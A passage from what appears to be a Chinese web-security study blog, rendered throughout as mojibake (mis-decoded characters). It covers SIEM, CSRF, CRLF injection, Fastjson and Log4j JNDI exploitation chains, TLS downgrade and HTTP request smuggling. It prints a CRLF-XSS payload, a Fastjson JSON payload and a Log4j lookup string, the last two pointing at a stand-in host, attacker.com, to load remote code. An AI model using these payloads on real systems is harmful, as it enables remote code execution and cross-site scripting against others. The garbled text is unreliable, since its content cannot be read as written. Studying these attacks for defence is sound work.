ç”¨æˆ·è¡Œä¸ºåˆ†æï¼ˆUEBAï¼‰- é«˜çº§SIEMè¶…è¶Šäº†è§„åˆ™å’Œç›¸å…³æ€§ï¼Œåˆ©ç”¨AIå’Œæ·±åº¦å­¦ä¹ æŠ€æœ¯æ¥ç ”ç©¶äººç±»è¡Œä¸ºçš„æ¨¡å¼ï¼Œæœ‰åŠ©äºæ£€æµ‹å†…éƒ¨å¨èƒã€é’ˆå¯¹æ€§æ”»å‡»å’Œæ¬ºéª—ã€‚ å®‰å…¨ç¼–æ’è‡ªåŠ¨åŒ–å“åº”ï¼ˆSOARï¼‰ - SIEMä¸ä¼ä¸šç³»ç»Ÿé›†æˆå¹¶è‡ªåŠ¨åŒ–å“åº”äº‹ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨æ”»å‡»è€…å¯ä»¥åŠ å¯†æ•°æ®ä¹‹å‰ï¼ŒSIEMå¯èƒ½ä¼šæ£€æµ‹åˆ°å‹’ç´¢è½¯ä»¶çš„è­¦æŠ¥å¹¶åœ¨å—å½±å“çš„ç³»ç»Ÿä¸Šè‡ªåŠ¨æ‰§è¡Œåº”å¯¹æ“ä½œã€‚</p><ul><li><strong>æ—¥å¿—ç®¡ç†</strong>ï¼šSIEMç³»ç»Ÿèƒ½å¤Ÿé›†ä¸­å­˜å‚¨å’Œåˆ†ææ¥è‡ªä¸åŒæºçš„æ—¥å¿—æ•°æ®ï¼ŒåŒ…æ‹¬é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€æœåŠ¡å™¨ã€åº”ç”¨ç¨‹åºç­‰ã€‚</li><li><strong>å®æ—¶ç›‘æ§</strong>ï¼šé€šè¿‡å®æ—¶åˆ†ææ—¥å¿—æ•°æ®ï¼ŒSIEMèƒ½å¤ŸåŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºæˆ–å®‰å…¨å¨èƒã€‚</li><li><strong>å®‰å…¨äº‹ä»¶æ£€æµ‹</strong>ï¼šåˆ©ç”¨é¢„å®šä¹‰çš„è§„åˆ™æˆ–æœºå™¨å­¦ä¹ ç®—æ³•ï¼ŒSIEMå¯ä»¥è¯†åˆ«å‡ºæ½œåœ¨çš„å®‰å…¨äº‹ä»¶å’Œæ”»å‡»æ¨¡å¼ã€‚</li><li><strong>åˆè§„æ€§æŠ¥å‘Š</strong>ï¼šSIEMç³»ç»Ÿèƒ½å¤Ÿå¸®åŠ©ç»„ç»‡æ»¡è¶³å„ç§åˆè§„æ€§è¦æ±‚ï¼Œå¦‚GDPRã€HIPAAç­‰ï¼Œé€šè¿‡ç”Ÿæˆå¿…è¦çš„æŠ¥å‘Šå’Œå®¡è®¡æ—¥å¿—ã€‚</li></ul><h3 id="8-CSRFæ”»å‡»åŠé˜²èŒƒ"><a href="#8-CSRFæ”»å‡»åŠé˜²èŒƒ" class="headerlink" title="8. CSRFæ”»å‡»åŠé˜²èŒƒ"></a>8. CSRFæ”»å‡»åŠé˜²èŒƒ</h3><p><strong>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</strong>æ˜¯ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…è¯±ä½¿ç”¨æˆ·åœ¨å·²ç»è®¤è¯çš„ç½‘ç«™ä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥è¯±ä½¿ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ï¼Œä»è€Œåœ¨ç”¨æˆ·å·²ç»ç™»å½•çš„é“¶è¡Œç½‘ç«™ä¸Šæ‰§è¡Œè½¬è´¦æ“ä½œã€‚</p><p><strong>é˜²èŒƒæªæ–½</strong>åŒ…æ‹¬ï¼š</p><ul><li><strong>ä½¿ç”¨Token</strong>ï¼šåœ¨æ¯ä¸ªè¡¨å•æˆ–è¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªå”¯ä¸€çš„Tokenï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶éªŒè¯Tokençš„æœ‰æ•ˆæ€§ã€‚</li><li><strong>SameSite Cookie</strong>ï¼šè®¾ç½®Cookieçš„SameSiteå±æ€§ï¼Œé™åˆ¶Cookieåœ¨è·¨ç«™è¯·æ±‚ä¸­çš„å‘é€ã€‚</li><li><strong>éªŒè¯Refererå¤´</strong>ï¼šæ£€æŸ¥è¯·æ±‚çš„Refererå¤´ï¼Œç¡®ä¿è¯·æ±‚æ˜¯ä»åˆæ³•çš„é¡µé¢å‘èµ·çš„ã€‚</li><li><strong>å®‰å…¨ç¼–ç¨‹</strong>ï¼šåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œéµå¾ªå®‰å…¨ç¼–ç çš„æœ€ä½³å®è·µï¼Œé¿å…å¼•å…¥CSRFæ¼æ´ã€‚</li></ul><h3 id="CRLF-æ¼æ´å¦‚ä½•åˆ©ç”¨æœ€å¤§åŒ–"><a href="#CRLF-æ¼æ´å¦‚ä½•åˆ©ç”¨æœ€å¤§åŒ–" class="headerlink" title="CRLF æ¼æ´å¦‚ä½•åˆ©ç”¨æœ€å¤§åŒ–"></a>CRLF æ¼æ´å¦‚ä½•åˆ©ç”¨æœ€å¤§åŒ–</h3><p>CRLFæ˜¯CRå’ŒLFä¸¤ä¸ªå­—ç¬¦çš„æ‹¼æ¥ï¼Œå®ƒä»¬åˆ†åˆ«ä»£è¡¨â€å›è½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰â€œï¼Œå…¨ç§°ä¸ºCarriage Return&#x2F;Line Feedâ€ï¼Œåå…­è¿›åˆ¶ç¼–ç åˆ†åˆ«ä¸º0x0då’Œ0x0aï¼ŒURLç¼–ç ä¸º%0Då’Œ%0Aã€‚CRå’ŒLFç»„åˆåœ¨ä¸€èµ·å³CRLFå‘½ä»¤ï¼Œå®ƒè¡¨ç¤ºé”®ç›˜ä¸Šçš„â€Enterâ€é”®ï¼Œè®¸å¤šåº”ç”¨ç¨‹åºå’Œç½‘ç»œåè®®ä½¿ç”¨è¿™äº›å‘½ä»¤ä½œä¸ºåˆ†éš”ç¬¦ã€‚<br>è€Œåœ¨HTTPåè®®ä¸­ï¼ŒHTTP headerä¹‹é—´æ˜¯ç”±ä¸€ä¸ªCRLFå­—ç¬¦åºåˆ—åˆ†éš”å¼€çš„ï¼ŒHTTP Headerä¸Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚<br>æ‰€ä»¥å¦‚æœç”¨æˆ·çš„è¾“å…¥åœ¨HTTPè¿”å›åŒ…çš„Headerå¤„å›æ˜¾ï¼Œä¾¿å¯ä»¥é€šè¿‡CRLFæ¥æå‰ç»“æŸå“åº”å¤´ï¼Œåœ¨å“åº”å†…å®¹å¤„æ³¨å…¥æ”»å‡»è„šæœ¬ã€‚å› æ­¤CRLF Injectionåˆå«HTTPå“åº”æ‹†åˆ†&#x2F;æˆªæ–­ï¼ˆHTTP Response Splittingï¼‰ç®€ç§°HRSã€‚</p><ol><li><strong>è§‚å¯Ÿè¾“å‡º</strong>ï¼šé¦–å…ˆï¼Œéœ€è¦è§‚å¯Ÿè¾“å‡ºæ˜¯å¦åœ¨è¿”å›å¤´ä¸­ï¼ŒæŸ¥çœ‹è¾“å…¥ï¼Œå¯èƒ½æ˜¯åœ¨URLå€¼å’Œå‚æ•°ã€cookieå¤´ä¸­ã€‚åœ¨è¿‡å¾€çš„æŒ–æ˜è¿‡ç¨‹ä¸­ï¼Œæœ€å¸¸è§çš„ä¸¤ç§æƒ…å†µæ˜¯ä½¿ç”¨è¾“å…¥å‚æ•°åˆ›å»ºCookieå’Œ302è·³è½¬locationå¤„ã€‚</li><li><strong>æäº¤%0D%0Aå­—ç¬¦</strong>ï¼šæäº¤<code>%0D%0A</code>å­—ç¬¦ï¼ŒéªŒè¯æœåŠ¡å™¨æ˜¯å¦å“åº”<code>%0D%0A</code>ï¼Œè‹¥è¿‡æ»¤å¯ä»¥é€šè¿‡åŒé‡ç¼–ç ç»•è¿‡ã€‚</li><li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šä½¿æ€ä¼¤æœ€å¤§åŒ–ï¼Œå°†æ¼æ´è½¬åŒ–ä¸ºHTMLæ³¨å…¥ï¼ŒXSSï¼Œç¼“å­˜ç­‰ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡æ³¨å…¥<code>X-XSS-Protection:0</code>æ¥ç»•è¿‡æµè§ˆå™¨çš„XSSä¿æŠ¤æœºåˆ¶ï¼Œä»è€Œæ‰§è¡Œåå°„å‹XSSæ”»å‡»ã€‚</li><li><strong>æ„é€ Payload</strong>ï¼šæ„é€ ç‰¹å®šçš„Payloadæ¥å®ç°æ”»å‡»ç›®çš„ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹Payloadè¿›è¡ŒCRLF-XSSæ”»å‡»ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e</span><br></pre></td></tr></table></figure>è¿™ä¸ªPayloadé¦–å…ˆè®¾ç½®<code>Content-Length</code>æ¥æ§åˆ¶å“åº”çš„é•¿åº¦ï¼Œç„¶åæ³¨å…¥<code>X-XSS-Protection:0</code>æ¥ç¦ç”¨XSSä¿æŠ¤ï¼Œæœ€åæ³¨å…¥XSSæ”»å‡»ä»£ç ã€‚</li><li><strong>é˜²å¾¡æ‰‹æ®µ</strong>ï¼šäº†è§£é˜²å¾¡æ‰‹æ®µæœ‰åŠ©äºæ›´å¥½åœ°åˆ©ç”¨æ¼æ´ã€‚é˜²å¾¡æ‰‹æ®µåŒ…æ‹¬å¯¹ç”¨æˆ·çš„æ•°æ®è¿›è¡Œåˆæ³•æ€§æ ¡éªŒï¼Œå¯¹ç‰¹æ®Šçš„å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œå¦‚<code>&lt;</code>ã€<code>&gt;</code>ã€<code>â€™</code>ã€<code>&quot;</code>ã€CRã€LFç­‰ï¼Œé™åˆ¶ç”¨æˆ·è¾“å…¥çš„CRå’ŒLFï¼Œæˆ–è€…å¯¹CRå’ŒLFå­—ç¬¦æ­£ç¡®ç¼–ç åå†è¾“å‡ºï¼Œä»¥é˜²æ­¢æ³¨å…¥è‡ªå®šä¹‰HTTPå¤´ã€‚<br>è¿˜å¯ä»¥é€ æˆåŒé‡å“åº”ï¼Œç±»ä¼¼ä¸‹å›¾<br><img src="/2024/03/16/work/workpre3/image.png"></li></ol><h3 id="Fastjsonçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š"><a href="#Fastjsonçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š" class="headerlink" title="Fastjsonçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š"></a>Fastjsonçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</h3><p><a href="https://alibaba.github.io/fastjson2/">Fastjsonç®€å•ä»‹ç»</a><br><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">Fastjsonååºåˆ—åŒ–æ¼æ´</a> <a href="https://www.freebuf.com/articles/web/365680.html">https://www.freebuf.com/articles/web/365680.html</a></p><ol><li><strong>ç›®æ ‡ç±»åŠ è½½</strong>ï¼šFastjsonå®ä¾‹åŒ–JdbcRowSetImplç±»ï¼ˆOracle JDKå†…ç½®ç±»ï¼‰ã€‚</li><li><strong>Setteræ–¹æ³•è§¦å‘</strong>ï¼šè°ƒç”¨setDataSourceName(â€œldap:&#x2F;&#x2F;attacker.com&#x2F;Exploitâ€)è®¾ç½®JNDIæ•°æ®æºã€‚</li><li><strong>JNDIä¸Šä¸‹æ–‡è¿æ¥</strong>ï¼šè°ƒç”¨setAutoCommit(true) â†’ è§¦å‘connect()æ–¹æ³• â†’ å‘æ¶æ„LDAPæœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</li><li><strong>è¿œç¨‹ä»£ç åŠ è½½</strong>ï¼šLDAPæœåŠ¡å™¨è¿”å›æŒ‡å‘<a href="http://attacker.com/Exploit.class%E7%9A%84Reference%E5%AF%B9%E8%B1%A1">http://attacker.com/Exploit.classçš„Referenceå¯¹è±¡</a> â†’ JVMåŠ è½½å¹¶æ‰§è¡Œè¿œç¨‹æ¶æ„ç±»ã€‚<br>æ”»å‡»è€…åˆ©ç”¨Fastjsonçš„AutoTypeç‰¹æ€§ï¼Œå‘é€æ¶æ„JSONæ•°æ®ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹æ¶æ„JSONæ•°æ®ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">  &quot;dataSourceName&quot;:&quot;ldap://attacker.com/Exploit&quot;,</span><br><span class="line">  &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a href="https://developer.aliyun.com/article/1634343">æœ‰å…³Fastjsonå®‰å…¨ç›¸å…³çš„å†…å®¹å¯ä»¥çœ‹è¿™ä¸ª</a><br><a href="https://www.cnblogs.com/johnnyzen/p/17814937.html">è¿˜æœ‰è¿™ä¸ª</a></li></ol><h3 id="Log4jæ¼æ´"><a href="#Log4jæ¼æ´" class="headerlink" title="Log4jæ¼æ´"></a><a href="https://blog.csdn.net/csd_ct/article/details/122916620">Log4jæ¼æ´</a></h3><p>ç‰¹åˆ«æ˜¯CVE-2021-44228ï¼Œæ˜¯ä¸€ä¸ªç”±äºJNDIæŸ¥æ‰¾åŠŸèƒ½å¯¼è‡´çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹åˆ¶çš„æ¶æ„æ—¥å¿—è¾“å…¥ï¼Œåˆ©ç”¨Log4jçš„JNDIè¿œç¨‹åŠ è½½åŠŸèƒ½æ¥æ‰§è¡Œä»£ç ã€‚ä»¥ä¸‹æ˜¯è¯¥æ¼æ´çš„è¯¦ç»†åˆ©ç”¨é“¾ï¼š</p><ol><li><strong>æ—¥å¿—è®°å½•è¾“å…¥</strong>ï¼šæ”»å‡»è€…æ§åˆ¶çš„è¾“å…¥è¢«è®°å½•ä¸ºæ—¥å¿—æ¶ˆæ¯ï¼Œä¾‹å¦‚é€šè¿‡Webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·è¾“å…¥ã€‚</li><li><strong>JNDIæ³¨å…¥</strong>ï¼šLog4jåœ¨å¤„ç†æ—¥å¿—äº‹ä»¶æ—¶ï¼Œä¼šè§£ææ—¥å¿—æ¶ˆæ¯ä¸­çš„å˜é‡ï¼ŒåŒ…æ‹¬JNDIæŸ¥æ‰¾è¡¨è¾¾å¼ï¼Œå¦‚<code>$&#123;jndi:ldap://attacker.com/malicious&#125;</code>ã€‚<a href="https://blog.csdn.net/wn084/article/details/80729230">æœ‰å…³JNDIå¯ä»¥çœ‹è¿™ç¯‡åšå®¢è®²çš„å¾ˆå¥½</a></li><li><strong>JNDIæœåŠ¡æŸ¥è¯¢</strong>ï¼šLog4jé€šè¿‡JNDIæœåŠ¡å°è¯•è§£æè¡¨è¾¾å¼ï¼Œè¿™å¯¼è‡´å‘æ”»å‡»è€…æ§åˆ¶çš„LDAPæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ã€‚</li><li><strong>æ¶æ„ç±»åŠ è½½</strong>ï¼šæ”»å‡»è€…åœ¨LDAPæœåŠ¡å™¨ä¸Šæ‰˜ç®¡æ¶æ„ç±»ï¼Œå½“Log4jå°è¯•é€šè¿‡JNDIåŠ è½½èµ„æºæ—¶ï¼Œå®ƒä¼šä»LDAPæœåŠ¡å™¨åŠ è½½å¹¶å®ä¾‹åŒ–è¿™ä¸ªæ¶æ„ç±»ã€‚</li><li><strong>ä»£ç æ‰§è¡Œ</strong>ï¼šæ¶æ„ç±»åœ¨å…¶æ„é€ å‡½æ•°æˆ–é™æ€åˆå§‹åŒ–å—ä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå½“ç±»è¢«åŠ è½½æ—¶ï¼Œä»£ç è¢«æ‰§è¡Œï¼Œä»è€Œå…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</li></ol><p>è¿™ç§æ”»å‡»é“¾åˆ©ç”¨äº†Log4jçš„é€’å½’è§£æåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å…è®¸æ”»å‡»è€…æ„é€ æ¶æ„è¯·æ±‚ï¼Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ¼æ´åˆ©ç”¨æ— éœ€ç‰¹æ®Šé…ç½®ï¼Œç»é˜¿é‡Œäº‘å®‰å…¨å›¢é˜ŸéªŒè¯ï¼ŒApache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰å‡å—å½±å“ã€‚</p><h3 id="TLSé™çº§æ¼æ´"><a href="#TLSé™çº§æ¼æ´" class="headerlink" title="TLSé™çº§æ¼æ´"></a>TLSé™çº§æ¼æ´</h3><p>TLS 1.0åè®®çš„å®‰å…¨é—®é¢˜å°¤ä¸ºçªå‡ºï¼Œå­˜åœ¨å¤šä¸ªå·²çŸ¥æ¼æ´ï¼Œä¾‹å¦‚ï¼šBEASTæ”»å‡»ï¼šåˆ©ç”¨TLS 1.0çš„åŠ å¯†å¼±ç‚¹ï¼Œæ”»å‡»è€…å¯ä»¥çªƒå–åŠ å¯†æ•°æ®ã€‚POODLEæ”»å‡»ï¼šé€šè¿‡é™çº§æ”»å‡»è¿«ä½¿æœåŠ¡å™¨ä½¿ç”¨TLS 1.0ï¼Œä»è€Œåˆ©ç”¨å…¶æ¼æ´è§£å¯†æ•°æ®ã€‚ç¼ºä¹ç°ä»£åŠ å¯†ç®—æ³•æ”¯æŒï¼šTLS 1.0ä¸æ”¯æŒæ›´å®‰å…¨çš„åŠ å¯†ç®—æ³•ï¼ˆå¦‚AES-GCMï¼‰ï¼Œå¯¼è‡´æ•°æ®å®¹æ˜“è¢«ç ´è§£ã€‚<br>POODLEï¼ˆPadding Oracle On Downgraded Legacy Encryptionï¼‰æ¼æ´æ˜¯ä¸€ç§å½±å“SSLv3åè®®çš„å®‰å…¨æ¼æ´ï¼Œå®ƒä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ä¸­é—´äººæ”»å‡»çš„æ–¹å¼ï¼Œçªƒå–åœ¨HTTPSé€šä¿¡ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„ç™»å½•å‡­è¯ã€cookieç­‰ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨SSLv3åè®®çš„ä¸€ç§å¼±ç‚¹æ¥å®ç°çš„ã€‚åœ¨SSLv3åè®®ä¸­ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯æ”¯æŒSSLv3åè®®ï¼Œä½†å®¢æˆ·ç«¯è¯·æ±‚ä½¿ç”¨TLSåè®®æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨é™çº§åˆ°SSLv3åè®®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œé€šè¿‡é€å­—èŠ‚åœ°è¯•æ¢æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„é€šä¿¡ï¼Œæ¥è·å–åŠ å¯†æ•°æ®çš„æ˜æ–‡ã€‚<br>POODLEæ”»å‡»åˆ©ç”¨äº†SSL 3.0 å’Œ TLS 1.0 ä¸­çš„æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥å¼ºåˆ¶æµè§ˆå™¨é™çº§åˆ° SSL 3.0ï¼Œç„¶ååˆ©ç”¨å…¶ä¸­çš„æ¼æ´ç ´è§£åŠ å¯†ã€‚POODLE æ”»å‡»åˆ©ç”¨äº† SSL 3.0 å’Œ TLS 1.0 ä¸­çš„æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥å¼ºåˆ¶æµè§ˆå™¨é™çº§åˆ° SSL 3.0ï¼Œç„¶ååˆ©ç”¨å…¶ä¸­çš„æ¼æ´ç ´è§£åŠ å¯†ã€‚ç”±äº TLS 1.0 æ”¯æŒé™çº§åˆ° SSL 3.0ï¼Œå› æ­¤ä¹Ÿå—åˆ° POODLE æ”»å‡»çš„å½±å“ã€‚</p><h3 id="HTTPè¯·æ±‚èµ°ç§æ¼æ´"><a href="#HTTPè¯·æ±‚èµ°ç§æ¼æ´" class="headerlink" title="HTTPè¯·æ±‚èµ°ç§æ¼æ´"></a><a href="https://www.freebuf.com/articles/web/243652.html">HTTPè¯·æ±‚èµ°ç§æ¼æ´</a></h3><p>å®ƒå…è®¸æ”»å‡»è€…åˆ©ç”¨HTTPåè®®çš„æŸäº›ç‰¹æ€§æ¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæ‰§è¡Œæœªæˆæƒçš„æ“ä½œã€‚è¿™ç§æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨ä½¿ç”¨HTTP&#x2F;1åè®®çš„ç³»ç»Ÿä¸­ï¼Œå› ä¸ºHTTP&#x2F;1è§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸï¼š<code>Content-Length</code> å¤´å’Œ <code>Transfer-Encoding</code> å¤´ã€‚<br>HTTPè¯·æ±‚èµ°ç§æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¯¹HTTPè¯·æ±‚çš„å¤„ç†æ–¹å¼ä¸ä¸€è‡´ã€‚ä¾‹å¦‚ï¼Œå‰ç«¯æœåŠ¡å™¨å¯èƒ½ä½¿ç”¨<code>Content-Length</code>æ ‡å¤´æ¥ç¡®å®šè¯·æ±‚çš„ç»“æŸï¼Œè€Œåç«¯æœåŠ¡å™¨å¯èƒ½ä½¿ç”¨<code>Transfer-Encoding</code>æ ‡å¤´ã€‚è¿™ç§ä¸ä¸€è‡´å¯èƒ½å¯¼è‡´è¯·æ±‚è¢«é”™è¯¯åœ°è§£æï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ’å…¥é¢å¤–çš„è¯·æ±‚æˆ–ä¿®æ”¹ç°æœ‰è¯·æ±‚ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„HTTPè¯·æ±‚æ¥åˆ©ç”¨è¿™ç§æ¼æ´ï¼Œä¾‹å¦‚ï¼š</p><ol><li><strong>CL.TEæ¼æ´</strong>ï¼šå‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>æ ‡å¤´ï¼Œå¹¶ç¡®å®šè¯·æ±‚æ­£æ–‡çš„é•¿åº¦ä¸º13å­—èŠ‚ï¼Œç›´åˆ°<code>SMUGGLED</code>çš„æœ«å°¾ã€‚æ­¤è¯·æ±‚å°†è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ã€‚åç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>æ ‡å¤´ï¼Œå› æ­¤å°†æ¶ˆæ¯æ­£æ–‡è§†ä¸ºä½¿ç”¨åˆ†å—ç¼–ç ã€‚å®ƒå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œè¯¥å—è¢«å£°æ˜ä¸ºé›¶é•¿åº¦ï¼Œå› æ­¤è¢«è§†ä¸ºç»ˆæ­¢è¯·æ±‚ã€‚ä»¥ä¸‹å­—èŠ‚<code>SMUGGLED</code>æœªè¢«å¤„ç†ï¼Œåç«¯æœåŠ¡å™¨ä¼šå°†è¿™äº›å­—èŠ‚è§†ä¸ºåºåˆ—ä¸­ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ã€‚</li><li><strong>ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶</strong>ï¼šåœ¨æŸäº›åº”ç”¨ç¨‹åºä¸­ï¼Œå‰ç«¯WebæœåŠ¡å™¨ç”¨äºå®ç°ä¸€äº›å®‰å…¨æ§åˆ¶ï¼Œå†³å®šæ˜¯å¦å…è®¸å¤„ç†å•ä¸ªè¯·æ±‚ã€‚å…è®¸çš„è¯·æ±‚å°†è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ï¼Œåœ¨é‚£é‡Œå®ƒä»¬è¢«è§†ä¸ºå·²é€šè¿‡å‰ç«¯æ§ä»¶ã€‚HTTPè¯·æ±‚èµ°ç§æ¼æ´å¯ç”¨äºç»•è¿‡è®¿é—®æ§åˆ¶ï¼Œæ–¹æ³•æ˜¯å°†è¯·æ±‚èµ°ç§åˆ°å—é™åˆ¶çš„URLã€‚</li><li><strong>æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚</strong>ï¼šå¦‚æœåº”ç”¨ç¨‹åºåŒ…å«ä»»ä½•ç±»å‹çš„åŠŸèƒ½ï¼Œå…è®¸æ‚¨å­˜å‚¨å’Œç¨åæ£€ç´¢æ–‡æœ¬æ•°æ®ï¼Œåˆ™å¯èƒ½ä¼šä½¿ç”¨å®ƒæ¥æ•è·å…¶ä»–ç”¨æˆ·è¯·æ±‚çš„å†…å®¹ã€‚è¿™äº›å¯èƒ½åŒ…æ‹¬ç”¨æˆ·æäº¤çš„ä¼šè¯ä»¤ç‰Œæˆ–å…¶ä»–æ•æ„Ÿæ•°æ®ã€‚</li><li><strong>åˆ©ç”¨åå°„å‹XSS</strong>ï¼šå¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°HTTPè¯·æ±‚èµ°ç§çš„æ”»å‡»ï¼Œå¹¶ä¸”è¿˜åŒ…å«åå°„å‹XSSï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¯·æ±‚èµ°ç§æ”»å‡»æ¥æ”»å‡»åº”ç”¨ç¨‹åºçš„å…¶ä»–ç”¨æˆ·ã€‚</li><li><strong>æ‰§è¡ŒWebç¼“å­˜ä¸­æ¯’</strong>ï¼šåˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¥æ‰§è¡ŒWebç¼“å­˜ä¸­æ¯’æ”»å‡»ã€‚å¦‚æœå‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•éƒ¨åˆ†æ‰§è¡Œå†…å®¹ç¼“å­˜ï¼Œåˆ™å¯èƒ½ä¼šä½¿ç”¨ç«™å¤–é‡å®šå‘å“åº”æ¥æ¯’å®³ç¼“å­˜ã€‚è¿™å°†ä½¿æ”»å‡»æŒç»­å­˜åœ¨ï¼Œå½±å“éšåè¯·æ±‚å—å½±å“URLçš„ä»»ä½•ç”¨æˆ·ã€‚</li></ol><p>ä¸ºäº†é˜²æ­¢HTTPè¯·æ±‚èµ°ç§ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ul><li>ç¡®ä¿æ‰€æœ‰æœåŠ¡å™¨å’Œä»£ç†éƒ½ä½¿ç”¨ç»Ÿä¸€çš„æ–¹æ³•æ¥è§£æHTTPè¯·æ±‚ã€‚</li><li>ç¦ç”¨ä¸å®‰å…¨çš„HTTPç‰¹æ€§ï¼Œå¦‚<code>Transfer-Encoding</code>ã€‚</li><li>ä½¿ç”¨HTTP&#x2F;2æˆ–æ›´é«˜ç‰ˆæœ¬çš„åè®®ï¼Œè¿™äº›åè®®æä¾›äº†æ›´ä¸¥æ ¼çš„è¯·æ±‚å¤„ç†æœºåˆ¶ã€‚</li><li>å®æ–½ä¸¥æ ¼çš„è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç ï¼Œä»¥é˜²æ­¢æ¶æ„æ•°æ®çš„æ³¨å…¥ã€‚</li><li>å®šæœŸè¿›è¡Œå®‰å…¨å®¡è®¡å’Œæ¸—é€æµ‹è¯•ï¼Œä»¥å‘ç°å’Œä¿®å¤æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</li></ul><p>å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼ˆOpen Shortest Path 